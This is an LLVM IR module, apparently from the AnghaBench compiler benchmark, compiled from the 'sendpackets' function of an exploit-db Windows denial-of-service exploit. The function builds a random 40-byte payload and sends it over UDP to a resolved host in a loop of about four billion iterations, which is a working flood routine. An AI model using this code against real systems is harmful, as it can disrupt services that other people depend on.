; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_36285.c_sendpackets.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_36285.c_sendpackets.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32*, i32 }
%struct.sockaddr = type { i32 }

@mutexactive = common dso_local global i32 0, align 4
@active = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [26 x i8] c"[-] Sending payload '%s'\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"unknown host '%s' \0A\00", align 1
@port = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [24 x i8] c"[!] Cannot open socket\0A\00", align 1
@.str.3 = private unnamed_addr constant [22 x i8] c"[!] Cannot send data\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @sendpackets(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca %struct.hostent*, align 8
  %14 = alloca [41 x i8], align 16
  store i8* %0, i8** %3, align 8
  %15 = call i32 @pthread_mutex_lock(i32* @mutexactive)
  %16 = load i32, i32* @active, align 4
  %17 = add nsw i32 %16, 1
  store i32 %17, i32* @active, align 4
  %18 = call i32 @pthread_mutex_unlock(i32* @mutexactive)
  %19 = call i32 @time(i32* null)
  %20 = call i32 @srand(i32 %19)
  store i64 0, i64* %11, align 8
  br label %21

21:                                               ; preds = %31, %1
  %22 = load i64, i64* %11, align 8
  %23 = icmp ult i64 %22, 40
  br i1 %23, label %24, label %34

24:                                               ; preds = %21
  %25 = call i32 (...) @rand()
  %26 = srem i32 %25, 78
  %27 = add nsw i32 %26, 30
  %28 = trunc i32 %27 to i8
  %29 = load i64, i64* %11, align 8
  %30 = getelementptr inbounds [41 x i8], [41 x i8]* %14, i64 0, i64 %29
  store i8 %28, i8* %30, align 1
  br label %31

31:                                               ; preds = %24
  %32 = load i64, i64* %11, align 8
  %33 = add i64 %32, 1
  store i64 %33, i64* %11, align 8
  br label %21

34:                                               ; preds = %21
  %35 = getelementptr inbounds [41 x i8], [41 x i8]* %14, i64 0, i64 40
  store i8 0, i8* %35, align 8
  %36 = getelementptr inbounds [41 x i8], [41 x i8]* %14, i64 0, i64 0
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8* %36)
  %38 = load i8*, i8** %3, align 8
  %39 = call %struct.hostent* @gethostbyname(i8* %38)
  store %struct.hostent* %39, %struct.hostent** %13, align 8
  %40 = load %struct.hostent*, %struct.hostent** %13, align 8
  %41 = icmp eq %struct.hostent* %40, null
  br i1 %41, label %42, label %46

42:                                               ; preds = %34
  %43 = load i8*, i8** %3, align 8
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %43)
  %45 = call i32 @exit(i32 1) #3
  unreachable

46:                                               ; preds = %34
  %47 = load %struct.hostent*, %struct.hostent** %13, align 8
  %48 = getelementptr inbounds %struct.hostent, %struct.hostent* %47, i32 0, i32 2
  %49 = load i32, i32* %48, align 8
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %49, i32* %50, align 4
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  %53 = bitcast i32* %52 to i8*
  %54 = load %struct.hostent*, %struct.hostent** %13, align 8
  %55 = getelementptr inbounds %struct.hostent, %struct.hostent* %54, i32 0, i32 1
  %56 = load i32*, i32** %55, align 8
  %57 = getelementptr inbounds i32, i32* %56, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = load %struct.hostent*, %struct.hostent** %13, align 8
  %60 = getelementptr inbounds %struct.hostent, %struct.hostent* %59, i32 0, i32 0
  %61 = load i32, i32* %60, align 8
  %62 = call i32 @memcpy(i8* %53, i32 %58, i32 %61)
  %63 = load i32, i32* @port, align 4
  %64 = call i32 @htons(i32 %63)
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 %64, i32* %65, align 4
  %66 = load i32, i32* @AF_INET, align 4
  %67 = load i32, i32* @SOCK_DGRAM, align 4
  %68 = call i32 @socket(i32 %66, i32 %67, i32 0)
  store i32 %68, i32* %4, align 4
  %69 = load i32, i32* %4, align 4
  %70 = icmp slt i32 %69, 0
  br i1 %70, label %71, label %74

71:                                               ; preds = %46
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.2, i64 0, i64 0))
  %73 = call i32 @pthread_exit(i8* null)
  br label %74

74:                                               ; preds = %71, %46
  store i32 0, i32* %8, align 4
  store i64 0, i64* %11, align 8
  br label %75

75:                                               ; preds = %95, %74
  %76 = load i64, i64* %11, align 8
  %77 = icmp ult i64 %76, 4294967295
  br i1 %77, label %78, label %98

78:                                               ; preds = %75
  %79 = load i32, i32* %4, align 4
  %80 = getelementptr inbounds [41 x i8], [41 x i8]* %14, i64 0, i64 0
  %81 = getelementptr inbounds [41 x i8], [41 x i8]* %14, i64 0, i64 0
  %82 = call i64 @strlen(i8* %81)
  %83 = add nsw i64 %82, 1
  %84 = load i32, i32* %8, align 4
  %85 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %86 = call i32 @sendto(i32 %79, i8* %80, i64 %83, i32 %84, %struct.sockaddr* %85, i32 12)
  store i32 %86, i32* %5, align 4
  %87 = load i32, i32* %5, align 4
  %88 = icmp slt i32 %87, 0
  br i1 %88, label %89, label %94

89:                                               ; preds = %78
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  %93 = call i32 @pthread_exit(i8* null)
  br label %94

94:                                               ; preds = %89, %78
  br label %95

95:                                               ; preds = %94
  %96 = load i64, i64* %11, align 8
  %97 = add i64 %96, 1
  store i64 %97, i64* %11, align 8
  br label %75

98:                                               ; preds = %75
  %99 = call i32 @pthread_mutex_lock(i32* @mutexactive)
  %100 = load i32, i32* @active, align 4
  %101 = add nsw i32 %100, -1
  store i32 %101, i32* @active, align 4
  %102 = call i32 @pthread_mutex_unlock(i32* @mutexactive)
  %103 = call i32 @pthread_exit(i8* null)
  %104 = load i8*, i8** %2, align 8
  ret i8* %104
}

declare dso_local i32 @pthread_mutex_lock(i32*) #1

declare dso_local i32 @pthread_mutex_unlock(i32*) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @time(i32*) #1

declare dso_local i32 @rand(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @pthread_exit(i8*) #1

declare dso_local i32 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
